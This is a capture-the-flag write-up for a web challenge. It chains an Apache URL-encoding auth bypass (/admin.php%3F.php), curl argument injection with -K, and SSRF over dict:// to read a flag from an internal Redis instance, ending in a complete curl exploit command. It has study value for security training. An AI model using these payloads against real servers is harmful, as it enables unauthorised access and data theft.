<img width="616" height="682" alt="image" src="https://github.com/user-attachments/assets/025a9bec-8c1c-44a0-90a9-edc89dfab987" />

# CTF Writeup: PHP-Redis

**Category:** Web Exploitation

**Points:** 350

**Vulnerability:** Authentication Bypass, SSRF, Redis Information Disclosure

## 1. Reconnaissance & Source Analysis

We started with a provided source code archive. The application was a "Network Monitor" allowing users to ping URLs.

### Critical Findings:

1. **`admin.php` (The Target):** This file contained the core logic but was protected by HTTP Basic Authentication.
2. **`apache2.conf` (The Lock):**Apache
    
    `<Files "admin.php">
        AuthType Basic
        Require valid-user
    </Files>`
    
    This blocked direct access to `admin.php`.
    
3. **`admin.php` (The Logic):**
The code had a strict protocol check (`http/https`), **unless** the `K` option was used:PHP
    
    `$using_config = ($param === '-K' && $param_value);
    if (!$using_config) {
        // Strict protocol check...
    }
    // Execution path via curl
    $command = 'cd /tmp && timeout 5 curl ...';`
    

---

## 2. Vulnerability I: Apache Auth Bypass

We encountered a `401 Unauthorized` when trying to access `admin.php`. The Apache configuration protected the exact filename `"admin.php"`, but the PHP-FPM configuration allowed executing any file ending in `.php`.

**The Exploit:** `URL Encoding Confusion`
We crafted a request to **`/admin.php%3F.php`**.

1. **Apache's View:** Decodes `%3F` to `?`. The filename becomes `admin.php?.php`. This **does not match** the protected string `"admin.php"`, so access is granted.
2. **PHP's View:** Receives the request. PHP treats `?` as the start of a query string. It executes the file `admin.php` and ignores the rest.

**Result:** Authentication bypassed completely.

---

## 3. Vulnerability II: SSRF & Argument Injection

With access to `admin.php`, we needed to exploit the `curl` command to reach the internal Redis service.

**The Bypass:**
The script normally forces `http/https`. By injecting `opt=-K` and `data=/dev/null`, we satisfied the `$using_config` check in the PHP code, skipping the protocol validation.

- **Payload:** `opt=-K`, `data=/dev/null`
- **Result:** We could now use any protocol supported by `curl`.

---

## 4. Obstacles & Pivot

We attempted to write a Webshell into Redis (RCE), but encountered errors:

1. **Gopher Disabled:** The server returned `Protocol "gopher" not supported`. We switched to the `dict://` protocol.
2. **RCE Failed:** Attempts to use `CONFIG SET` and `SAVE` returned errors.

**Root Cause Analysis:**
We inspected `challenge/config/redis-start.sh` and found that the challenge author had renamed dangerous commands to empty strings:

Bash

`rename-command CONFIG ""
rename-command SAVE ""
rename-command SET ""`

This made RCE impossible. However, the script **explicitly set the flag** in the database on startup:

Bash

`redis-cli SET flag "RE:CTF{fake_flag}"`

This meant the goal was **Information Disclosure**, not RCE.

---

## 5. Final Exploit

We used the `dict://` protocol to query Redis directly. Since `curl` can crash on spaces in `dict` URLs, we used colon separators.

**Step 1: List Keys**
Payload: `dict://redis:6379/keys:*`
Response: Found key `flag`.

**Step 2: Retrieve Flag**
Payload: `dict://redis:6379/get:flag`

### The Command

Bash

`curl -X POST "http://5.223.57.169:8080/admin.php%3F.php" \
     -d "action=ping" \
     -d "opt=-K" \
     -d "data=/dev/null" \
     -d "url=dict://redis:6379/get:flag"`

---

## Flag

**`RE:CTF{0r4ng3_1z_my_g04t_plu5_u_d0nt_n33d_g0ph3r}`**

### Key Takeaways

1. **Orange Tsai's technique** (URL parser confusion) remains a powerful way to bypass ACLs.
2. **Curl Argument Injection** (`K`) can defeat application-layer filters.
3. **Protocol Smuggling:** If `gopher` is dead, check `dict`.
4. **Always enumerate:** When RCE fails, check if the goal is simpler (reading data).
